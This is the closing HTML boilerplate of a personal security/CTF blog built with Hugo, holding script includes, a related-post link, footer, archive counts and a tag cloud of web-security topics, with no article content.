                src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"integrity="sha384-g7c&#43;Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI&#43;sEnkvrMWph2EDg4"crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC&#43;Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa"crossorigin="anonymous"
                defer="true"
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ]
        });})
</script>
    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="has-image">
    <a href="/p/wmctf2020/">
        
        
            <div class="article-image">
                
                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228100849.jpeg" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228100849.jpeg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">W&amp;MCTF2020</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>


    
        
    <div class="disqus-container">
    
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (DISQUS) {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2019 - 
        
        2021 wh1sper
    </section>
    
    <section class="powerby">
        
            welcome to wh1sper's blog <br/>
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >
            </main>
    
    
    <aside class="sidebar right-sidebar sticky">
        
            <form action="/search/" class="search-form widget" >
        <p>
            <label>æœç´¢</label>
            <input name="keyword" required placeholder="è¾“å…¥å…³é”®è¯..." />
        
            <button title="æœç´¢">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



            </button>
        </p>
    </form>
        
            <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
</svg>



        </div>
        <h2 class="widget-title section-title">å½’æ¡£</h2>

        
        
        
        
        
        <div class="widget-archive--list">
            <div class="archives-year">
                    <a href="/archives/#2021">
                        
                            <span class="year">2021</span>
                            <span class="count">8</span>
                        
                    </a> 
                </div>
            <div class="archives-year">
                    <a href="/archives/#2020">
                        
                            <span class="year">2020</span>
                            <span class="count">36</span>
                        
                    </a> 
                </div>
            <div class="archives-year">
                    <a href="/archives/#2019">
                        
                            <span class="year">2019</span>
                            <span class="count">1</span>
                        
                    </a> 
                </div>
            
        </div>
    </section>
        
            <section class="widget tagCloud">
    <div class="widget-icon">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
  <circle cx="9" cy="9" r="2" />
</svg>



    </div>
    <h2 class="widget-title section-title">æ ‡ç­¾äº‘</h2>

    <div class="tagCloud-tags">
        
            <a href="/tags/sqli/" class="font_size_8">
                SQLi
            </a>
        
            <a href="/tags/rce-bypass/" class="font_size_5">
                RCE bypass
            </a>
        
            <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="font_size_4">
                PHPååºåˆ—åŒ–
            </a>
        
            <a href="/tags/ssrf/" class="font_size_4">
                SSRF
            </a>
        
            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="font_size_4">
                ä»£ç å®¡è®¡
            </a>
        
            <a href="/tags/cve/" class="font_size_3">
                CVE
            </a>
        
            <a href="/tags/hackthebox/" class="font_size_3">
                HackTheBox
            </a>
        
            <a href="/tags/nodejs/" class="font_size_3">
                NodeJS
            </a>
        
            <a href="/tags/phar/" class="font_size_3">
                phar
            </a>
        
            <a href="/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="font_size_3">
                pythonååºåˆ—åŒ–
            </a>
        
            <a href="/tags/redis/" class="font_size_3">
                Redis
            </a>
        
            <a href="/tags/webcrypto/" class="font_size_3">
                WebCrypto
            </a>
        
            <a href="/tags/xxe/" class="font_size_3">
                XXE
            </a>
        
            <a href="/tags/flask/" class="font_size_2">
                flask
            </a>
        
            <a href="/tags/session.upload_progress/" class="font_size_2">
                session.upload_progress
            </a>
        
            <a href="/tags/ssti/" class="font_size_2">
                SSTI
            </a>
        
            <a href="/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" class="font_size_2">
                ä¼ªéšæœºæ•°
            </a>
        
            <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" class="font_size_2">
                å †å æ³¨å…¥
            </a>
        
            <a href="/tags/%E6%8F%90%E6%9D%83/" class="font_size_2">
                ææƒ
            </a>
        
            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="font_size_2">
                æ–‡ä»¶åŒ…å«
            </a>
        
    </div>
</section>
        
    </aside>


        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
